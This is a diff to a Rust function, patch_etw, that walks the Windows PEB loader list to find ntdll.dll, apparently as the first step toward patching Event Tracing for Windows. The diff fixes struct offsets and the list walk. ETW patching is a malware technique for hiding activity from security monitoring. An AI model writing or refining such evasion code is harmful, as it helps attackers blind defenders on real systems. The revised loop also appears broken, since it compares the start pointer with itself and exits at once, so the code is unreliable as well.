@@ -7,7 +7,10 @@ unsafe fn patch_etw() {
 
     #[repr(C)]
     struct PEB {
-        _reserved: [u8; 8],
+        // x64: InheritedAddressSpace(0x00), ReadImageFileExecOptions(0x01),
+        // BeingDebugged(0x02), BitField(0x03), Mutant(0x08),
+        // ImageBaseAddress(0x10), Ldr at 0x18.
+        _reserved: [u8; 24],
         ldr: *mut PEB_LDR_DATA,
     }
 
@@ -25,9 +28,11 @@ unsafe fn patch_etw() {
 
     #[repr(C)]
     struct LDR_DATA_TABLE_ENTRY {
-        _reserved: [u8; 32],
+        // Walked via InLoadOrderLinks (entry+0x00): DllBase at 0x30,
+        // FullDllName at 0x48, BaseDllName at 0x58 (its Buffer at 0x60).
+        _reserved: [u8; 48],
         dll_base: *mut u8,
-        _reserved2: [u8; 24],
+        _reserved2: [u8; 40],
         base_dll_name: *mut u16,
     }
 
@@ -47,18 +52,25 @@ unsafe fn patch_etw() {
         }
     }
 
-    let mut current = (*(*peb_ptr).ldr).in_load_order_module_list;
+    let head = (*(*peb_ptr).ldr).in_load_order_module_list;
+    let mut current = head;
     let ntdll_name = b"ntdll.dll\0";
     let mut ntdll_base: *mut u8 = std::ptr::null_mut();
 
-    while !current.is_null() {
+    // Stop at the list head instead of dereferencing it as a table entry:
+    // the head lives inside PEB_LDR_DATA, not inside an LDR_DATA_TABLE_ENTRY.
+    loop {
+        if current == head {
+            break;
+        }
         let entry = current as *mut LDR_DATA_TABLE_ENTRY;
         let dll_name = (*entry).base_dll_name;
         if !dll_name.is_null() {
             let mut i = 0;
             let mut match_found = true;
             while ntdll_name[i] != 0 {
-                if (*dll_name.add(i)) as u8 != ntdll_name[i] {
+                let c = (*dll_name.add(i)) as u8;
+                if c.to_ascii_lowercase() != ntdll_name[i] {
                     match_found = false;
                     break;
                 }
